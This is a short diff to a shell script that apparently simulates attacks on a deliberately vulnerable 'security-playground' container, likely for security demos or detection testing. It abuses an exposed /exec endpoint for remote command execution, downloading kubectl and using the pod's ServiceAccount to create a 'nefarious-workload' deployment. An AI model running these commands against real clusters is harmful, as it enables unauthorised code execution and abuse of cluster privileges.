@@ -65,7 +65,7 @@ echo "8. Call the Kubernetes API via security-playground's K8s ServiceAccount"
 echo "--------------------------------------------------------------------------------"
 curl -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=curl -O https://s3.us-west-2.amazonaws.com/amazon-eks/1.28.3/2023-11-14/bin/linux/$ARCH/kubectl"
 curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=chmod 0755 ./kubectl'
-curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=./kubectl create deployment nefarious-workload --image=public.ecr.aws/m9h2b5e7/security-playground:070124'
+curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=./kubectl create deployment nefarious-workload --image=public.ecr.aws/m9h2b5e7/security-playground:240324'
 curl -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=./kubectl get pods'
 echo "--------------------------------------------------------------------------------"
 sleep 10
